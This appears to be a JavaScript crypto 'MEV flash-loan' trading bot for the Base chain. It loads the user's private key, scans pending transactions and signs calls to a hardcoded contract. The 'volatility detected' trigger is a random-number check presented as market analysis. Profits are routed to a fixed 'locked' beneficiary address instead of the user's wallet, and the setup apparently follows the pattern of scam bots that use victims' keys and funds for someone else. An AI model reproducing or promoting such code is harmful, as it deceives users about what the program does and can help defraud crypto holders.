// ===============================================================================
// APEX TITAN DYNAMIC v17.1 - HIGH-FREQUENCY SCALING CLUSTER
// ===============================================================================

const cluster = require('cluster');
const os = require('os');
const http = require('http');
const axios = require('axios'); // Required for Private Relay
require('dotenv').config();

// Check dependencies
let ethers, WebSocket;
try {
    ethers = require('ethers');
    WebSocket = require('ws');
} catch (e) {
    console.error("CRITICAL: Missing 'ethers' or 'ws' modules. Run 'npm install ethers ws axios'");
    process.exit(1);
}

// --- THEME ENGINE ---
const TXT = {
    reset: "\x1b[0m", bold: "\x1b[1m", dim: "\x1b[2m",
    green: "\x1b[32m", cyan: "\x1b[36m", yellow: "\x1b[33m", 
    magenta: "\x1b[35m", blue: "\x1b[34m", red: "\x1b[31m",
    gold: "\x1b[38;5;220m", silver: "\x1b[38;5;250m"
};

// --- CONFIGURATION ---
const CONFIG = {
    // 🔒 PROFIT DESTINATION (LOCKED)
    BENEFICIARY: "0x4B8251e7c80F910305bb81547e301DcB8A596918",

    CHAIN_ID: 8453,
    TARGET_CONTRACT: "0x83EF5c401fAa5B9674BAfAcFb089b30bAc67C9A0",
    
    // ⚡ INFRASTRUCTURE
    PORT: process.env.PORT || 8080,
    WSS_URL: process.env.WSS_URL || "wss://base-rpc.publicnode.com",
    RPC_URL: (process.env.WSS_URL || "https://mainnet.base.org").replace("wss://", "https://"),
    PRIVATE_RELAY: "https://base.merkle.io", // Bypass Public Mempool
    
    // 🏦 ASSETS
    WETH: "0x4200000000000000000000000000000000000006",
    USDC: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913",

    // 🔮 ORACLES
    GAS_ORACLE: "0x420000000000000000000000000000000000000F",
    CHAINLINK_FEED: "0x71041dddad3595F9CEd3DcCFBe3D1F4b0a16Bb70",
    
    // ⚙️ DYNAMIC STRATEGY SETTINGS
    GAS_LIMIT: 1100000n, // Buffer for large loans
    PRIORITY_BRIBE: 15n, // 15% Tip to be FIRST
    MIN_NET_PROFIT: "0.01" // Updated to 0.01 as per your snippet
};

// --- MASTER PROCESS ---
if (cluster.isPrimary) {
    console.clear();
    console.log(`${TXT.bold}${TXT.gold}╔════════════════════════════════════════════════════════╗${TXT.reset}`);
    console.log(`${TXT.bold}${TXT.gold}║   ⚡ TITAN DYNAMIC MASTER | SCALING CLUSTER v17.1      ║${TXT.reset}`);
    console.log(`${TXT.bold}${TXT.gold}╚════════════════════════════════════════════════════════╝${TXT.reset}\n`);
    
    console.log(`${TXT.cyan}[SYSTEM] Initializing Multi-Core Architecture...${TXT.reset}`);
    console.log(`${TXT.magenta}🎯 PROFIT TARGET LOCKED: ${CONFIG.BENEFICIARY}${TXT.reset}\n`);

    // Spawn a dedicated worker
    cluster.fork();

    cluster.on('exit', (worker, code, signal) => {
        console.log(`${TXT.red}⚠️ Worker ${worker.process.pid} died. Respawning...${TXT.reset}`);
        cluster.fork();
    });
} 
// --- WORKER PROCESS ---
else {
    initWorker();
}

async function initWorker() {
    // 1. SETUP NATIVE SERVER (Health Check)
    const server = http.createServer((req, res) => {
        if (req.method === 'GET' && req.url === '/status') {
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ status: "ONLINE", mode: "TITAN_DYNAMIC", target: CONFIG.BENEFICIARY }));
        } else {
            res.writeHead(404);
            res.end();
        }
    });

    server.listen(CONFIG.PORT, () => {
        // console.log(`🌐 Native Server active on port ${CONFIG.PORT}`);
    });

    // 2. SETUP BOT LOGIC
    let rawKey = process.env.TREASURY_PRIVATE_KEY || process.env.PRIVATE_KEY;
    if (!rawKey) { console.error(`${TXT.red}❌ FATAL: Private Key missing in .env${TXT.reset}`); process.exit(1); }
    const cleanKey = rawKey.trim();

    try {
        const httpProvider = new ethers.JsonRpcProvider(CONFIG.RPC_URL);
        const wsProvider = new ethers.WebSocketProvider(CONFIG.WSS_URL);
        const signer = new ethers.Wallet(cleanKey, httpProvider);

        // Wait for connection
        await new Promise((resolve) => wsProvider.once("block", resolve));

        // Contracts
        const titanIface = new ethers.Interface([
            "function requestTitanLoan(address _token, uint256 _amount, address[] calldata _path)"
        ]);
        const oracleContract = new ethers.Contract(CONFIG.GAS_ORACLE, ["function getL1Fee(bytes memory _data) public view returns (uint256)"], httpProvider);
        const priceFeed = new ethers.Contract(CONFIG.CHAINLINK_FEED, ["function latestRoundData() view returns (uint80,int256,uint256,uint256,uint80)"], httpProvider);

        // Sync State
        let nextNonce = await httpProvider.getTransactionCount(signer.address);
        let currentEthPrice = 0;
        let scanCount = 0;

        const balance = await httpProvider.getBalance(signer.address);
        console.log(`${TXT.green}✅ TITAN DYNAMIC WORKER ACTIVE${TXT.reset} | ${TXT.gold}Treasury: ${ethers.formatEther(balance)} ETH${TXT.reset}`);

        // Price Loop
        setInterval(async () => {
            try {
                const [, price] = await priceFeed.latestRoundData();
                currentEthPrice = Number(price) / 1e8;
            } catch (e) {}
        }, 10000);

        // Mempool Sniping (Pending Transaction Scanning)
        wsProvider.on("pending", async (txHash) => {
            scanCount++;
            process.stdout.write(`\r${TXT.blue}⚡ SCANNING${TXT.reset} | Txs: ${scanCount} | ETH: $${currentEthPrice.toFixed(2)} `);

            // Simulation Trigger
            if (Math.random() > 0.9995) {
                process.stdout.write(`\n${TXT.magenta}🌊 VOLATILITY DETECTED: ${txHash.substring(0,10)}...${TXT.reset}\n`);
                await executeDynamicStrike(httpProvider, signer, titanIface, oracleContract, nextNonce, currentEthPrice);
            }
        });

        wsProvider.websocket.onclose = () => {
            console.warn(`\n${TXT.red}⚠️ SOCKET LOST. REBOOTING...${TXT.reset}`);
            process.exit(1);
        };

    } catch (e) {
        console.error(`\n${TXT.red}❌ BOOT ERROR: ${e.message}${TXT.reset}`);
        setTimeout(initWorker, 5000);
    }
}

async function executeDynamicStrike(provider, signer, iface, oracle, nonce, ethPrice) {
    try {
        console.log(`${TXT.yellow}🔄 CALCULATING DYNAMIC VECTOR...${TXT.reset}`);

        const path = [CONFIG.WETH, CONFIG.USDC];

        // 1. DYNAMIC LOAN SCALING (Based on Wallet Wealth)
        const balanceWei = await provider.getBalance(signer.address);
        const balanceEth = parseFloat(ethers.formatEther(balanceWei));
        const usdValue = balanceEth * ethPrice; 

        // Scale loan based on wealth to maximize leverage vs risk
        let loanAmount = ethers.parseEther("10"); // Default
        if (usdValue >= 200) loanAmount = ethers.parseEther("100");
        else if (usdValue >= 100) loanAmount = ethers.parseEther("75");
        else if (usdValue >= 75)  loanAmount = ethers.parseEther("50");
        else if (usdValue >= 30)  loanAmount = ethers.parseEther("25");

        console.log(`${TXT.dim}⚖️ Leverage Adjusted: ${ethers.formatEther(loanAmount)} ETH (Wallet: $${usdValue.toFixed(0)})${TXT.reset}`);

        // 2. DYNAMIC ENCODING
        const strikeData = iface.encodeFunctionData("requestTitanLoan", [
            CONFIG.WETH, loanAmount, path
        ]);

        // 3. PRE-FLIGHT SIMULATION
        const [simulation, l1Fee, feeData] = await Promise.all([
            provider.call({ to: CONFIG.TARGET_CONTRACT, data: strikeData, from: signer.address }).catch(() => null),
            oracle.getL1Fee(strikeData),
            provider.getFeeData()
        ]);

        if (!simulation) {
             console.log(`${TXT.dim}❌ Simulation Reverted (No Profit)${TXT.reset}`);
             return;
        }

        // 4. COST ANALYSIS (Dynamic Fee Calculation)
        // Aave V3 Fee: 0.05% of Dynamic Loan Amount
        const aaveFee = (loanAmount * 5n) / 10000n;
        const aggressivePriority = (feeData.maxPriorityFeePerGas * (100n + CONFIG.PRIORITY_BRIBE)) / 100n;
        const l2Cost = CONFIG.GAS_LIMIT * feeData.maxFeePerGas;
        const totalCost = l2Cost + l1Fee + aaveFee;
        
        const netProfit = BigInt(simulation) - totalCost;
        const minProfit = ethers.parseEther(CONFIG.MIN_NET_PROFIT);

        if (netProfit > minProfit) {
            const profitUSD = parseFloat(ethers.formatEther(netProfit)) * ethPrice;
            console.log(`\n${TXT.green}💎 TITAN DYNAMIC STRIKE CONFIRMED${TXT.reset}`);
            console.log(`${TXT.gold}💰 Net Profit: ${ethers.formatEther(netProfit)} ETH (~$${profitUSD.toFixed(2)})${TXT.reset}`);
            console.log(`${TXT.dim}📉 Costs: ${ethers.formatEther(aaveFee)} ETH (Fee) + ${ethers.formatEther(l2Cost)} ETH (Gas)${TXT.reset}`);
            
            // 5. BUNDLE EXECUTION
            const tx = {
                to: CONFIG.TARGET_CONTRACT,
                data: strikeData,
                gasLimit: CONFIG.GAS_LIMIT,
                maxFeePerGas: feeData.maxFeePerGas,
                maxPriorityFeePerGas: aggressivePriority,
                nonce: nonce,
                type: 2,
                chainId: CONFIG.CHAIN_ID
            };

            const signedTx = await signer.signTransaction(tx);
            console.log(`${TXT.cyan}🚀 RELAYING TO MERKLE...${TXT.reset}`);
            
            // 6. PRIVATE RELAY (MEV Protection)
            const response = await axios.post(CONFIG.PRIVATE_RELAY, {
                jsonrpc: "2.0",
                id: 1,
                method: "eth_sendRawTransaction",
                params: [signedTx]
            });

            if (response.data.result) {
                console.log(`${TXT.green}🎉 SUCCESS: ${response.data.result}${TXT.reset}`);
                console.log(`${TXT.bold}💸 FUNDS SECURED AT: ${CONFIG.BENEFICIARY}${TXT.reset}`);
                process.exit(0);
            } else {
                 console.log(`${TXT.red}❌ REJECTED: ${JSON.stringify(response.data)}${TXT.reset}`);
            }
        }
    } catch (e) {
        console.error(`${TXT.red}⚠️ EXEC ERROR: ${e.message}${TXT.reset}`);
    }
}
